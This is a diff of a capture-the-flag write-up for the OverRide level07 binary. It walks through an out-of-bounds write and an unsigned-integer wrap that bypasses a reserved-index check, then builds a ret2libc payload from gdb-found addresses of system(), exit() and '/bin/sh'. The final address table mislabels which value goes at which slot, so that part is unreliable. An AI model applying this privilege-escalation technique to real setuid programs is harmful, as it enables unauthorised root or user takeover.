@@ -13,12 +13,56 @@ total 12
 We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with **`level08` privileges**.
 
 ```bash
-blablabla
-blablabla
-blablabla
+level07@OverRide:~$ ./level07 
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!   
+----------------------------------------------------
+ Commands:                                          
+    store - store a number into the data storage    
+    read  - read a number from the data storage     
+    quit  - exit the program                        
+----------------------------------------------------
+   wil has reserved some storage :>                 
+----------------------------------------------------
+
+Input command: store
+ Number: 42
+ Index: 16
+ Completed store command successfully
+Input command: read
+ Index: 16
+ Number at data[16] is 42
+ Completed read command successfully
+Input command: store
+ Number: 42
+ Index: -1
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+Input command: store
+ Number: 42
+ Index: -2
+ Completed store command successfully
+Input command: read
+ Index: -2
+ Number at data[4294967294] is 42
+ Completed read command successfully
+Input command: quit
+level07@OverRide:~$ 
 ```
 
-blablabla
+The program wait for 3 differents commands that controls a data storage service.
+
+But it look like there is no verification on the user input, and is possible to read out of the data storage.
+
+And there is some index that are reserved by "wil".
+
+The program waits for 3 different commands that control a data storage service.
+
+It looks like there is no verification on the user input, and it is possible to read out of the data storage.
+
+And some indices appear to be reserved by "wil".
 
 ## 2. Analyze The Executable
 
@@ -38,41 +82,53 @@ Non-debugging symbols:
 
 #### main function
 
-blablabla
+The `main` function enters a command loop.
+
+It accepts three commands: "store" *(calls `store_number()`)*, "read" *(calls `read_number()`)*, and "quit" *(exits the program)*.
 
 #### read_number function
 
-blablabla
+The `read_number` function prompts for an index and displays the value stored at `data[index]`.
+
+There is no bounds checking, allowing reads anywhere in memory.
 
 #### store_number function
 
-blablabla
+The `store_number` function prompts for a number and index, then stores the number at `data[index]`.
+
+It rejects indices that are multiples of 3 *(index reserved by wil)* or numbers starting with `0xb7` *(meaning stack addresses)*.
 
 ## 3. Identify The Vulnerability
 
-With the store and read feature that miss protection, we can found the position on saved EIP from the data storage, and overwrite it.
+The `store` and `read` functions lack proper bounds checking on the array index.
 
-Like that, we will be able to procedd to a ret2libc attack.
+We can write beyond the 100-element array directly into the stack, allowing us to overwrite the `SAVED EIP` and execute a `ret2libc` attack.
 
-With this stack partern :
+### ret2libc Exploit
+
+The ret2libc payload pattern on the stack is:
 
 ```
 EBP + 12	[  arg 2  ]		[ "/bin/sh" address ]
-EBP + 8		[  arg 1  ]		[ exit address ]
-EBP + 4		[SAVED EIP]		[ system address ]
+EBP + 8		[  arg 1  ]		[ exit() address ]
+EBP + 4		[SAVED EIP]		[ system() address ]
 ```
 
-### Exploit Developpment
+And this will lead to redirect in the `system()` function, with a stack frame as follows:
 
-The array is of a size of 100 but we can go further. So will we write after the table, in the stack, directly via the store command of the program.
-And we will setup the value to create a ret2libc when we will stop the program.
+```
+EBP + 8		[  arg 1  ]		[ "/bin/sh" address ]
+EBP + 4		[SAVED EIP]		[ exit address ]
+```
+
+We'll use the `store` command to write these values beyond the array bounds, setting up a `ret2libc` attack when the program returns.
 
 ### Get Exploit Values
 
-For that we need to found : 
-- system address
-- exit address *(optional)*
-- "/bin/sh" address
+First, we need to find the addresses : 
+- system
+- exit *(optional)*
+- "/bin/sh"
 
 ```bash
 (gdb) p system 
@@ -104,14 +160,14 @@ Mapped address spaces:
 1 pattern found.
 ```
 
-So we got :
+Addresses found :
 ```
-system address				0xf7e6aed0
-exit address *(optional)*	0xf7e5eb70
-"/bin/sh" address			0xf7f897ec
+system				0xf7e6aed0
+exit *(optional)*	0xf7e5eb70
+"/bin/sh"			0xf7f897ec
 ```
 
-### Found SAVED EIP Position
+### Find SAVED EIP Position
 
 With `gdb` command `info frame` we can get the information of the stack frame:
 
@@ -125,9 +181,11 @@ Stack level 0, frame at 0xffffd6a0:
   ebp at 0xffffd698, eip at 0xffffd69c
 ```
 
-So saved eip is at `0xffffd69c`.
+So SAVED EIP is at `0xffffd69c`.
 
 ---
+
+From the C and assembly, the data array *(`local_1bc` in C file)* starts at `ESP + 0x24`:
 
 ```c
 undefined4 local_1bc [100];
@@ -140,17 +198,18 @@ local_2c = store_number(local_1bc);
    0x080488ea <+455>:	call   0x8048630 <store_number>
 ```
 
-With the c and assembly dump, we see that the data storage is called `local_1bc` and stored at `%esp+0x24`.
+And to get tits address :
 
 ```bash
 (gdb) p $esp+0x24
 $2 = (void *) 0xffffd4d4
 ```
 
-So the data array is at `0xffffd4d4`.
+The data array is at `0xffffd4d4`.
 
 ---
 
+From the 2 addresses found, we can calculate the offset:
 ```
 0xffffd69c - 0xffffd4d4 = 456 bytes
 ```
@@ -163,7 +222,7 @@ ____________________________________
 114 % 3 = 0
 ```
 
-Because of this `if` statement :
+Index 114 is rejected because of the wil reserved index :
 ```c
   if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
     puts(" *** ERROR! ***");
@@ -171,42 +230,44 @@ Because of this `if` statement :
     puts(" *** ERROR! ***");
 ```
 
-We cannot write this position as a storage position.
+We cannot write this value as a storage index.
 
-### UInt Overflow
+### UInteger Overflow Bypass
 
-But because of how the array position is selected :
+But because of how the array position is selected, we can use a Interger Overflow.
 
 ```c
     *(uint *)(uVar2 * 4 + param_1) = uVar1;
 ```
 
-We can proceed to an uint overflow to get the position we want.
+The `store` function calculates the address as `data + (index * 4)`, with the index being a unsigned int.
 
-uintmax is `4294967295`. So uint + 1 : `4294967296` is equal to `0`.
-From this :
+
+The maximum uint value is `4294967295`, so:
 ```
-4294967296 / 4 = 1073741824
+4294967295 + 1 = 4294967296 (wraps to index 0)
+4294967296 / 4 = 1073741824 (wraps to index 0)
+_____________________________________________________
 
-(1073741824 + 114) * 4 = 456
+(1073741824 + 114) * 4 = 456 bytes
 
 1073741824 + 114 = 1073741938
 ```
 
-So by sending the position `1073741938`, we will write at the 114th element of the data storage.
+The index `1073741938` overflows and writes to position `114`, bypassing the modulo 3 check.
 
 ---
 
-### Final Values
+### Calculate Final Values
 
-We need to convert the addresses in decimal, because it will be stored as values :
+We need to convert the addresses in decimal, since they are stored as uint values :
 
 ```
-system	:	0xf7e6aed0	:	4159090384
+system	:	0xf7e6aed0	=	4159090384
 
-exit	:	0xf7e5eb70	:	4159040368
+exit	:	0xf7e5eb70	=	4159040368
 
-/bin/sh	:	0xf7f897ec	:	4160264172
+/bin/sh	:	0xf7f897ec	=	4160264172
 ```
 
 And with the position of SAVED EIP at table[114], we can deduce :
@@ -214,11 +275,10 @@ And with the position of SAVED EIP at table[114], we can deduce :
 ```
 EBP + 12	[  arg 2  ]	 |	[ table[116] ]	:	system	:	0xf7e6aed0	=	4159090384
 EBP + 8		[  arg 1  ]	 |	[ table[115] ]	:	exit	:	0xf7e5eb70	=	4159040368
-
 EBP + 4		[SAVED EIP]	 |	[ table[114] ]	:	bin/sh	:	0xf7f897ec	=	4160264172
 ```
 
-So will we store :
+So we will store :
 
 ```
 value: 4159090384
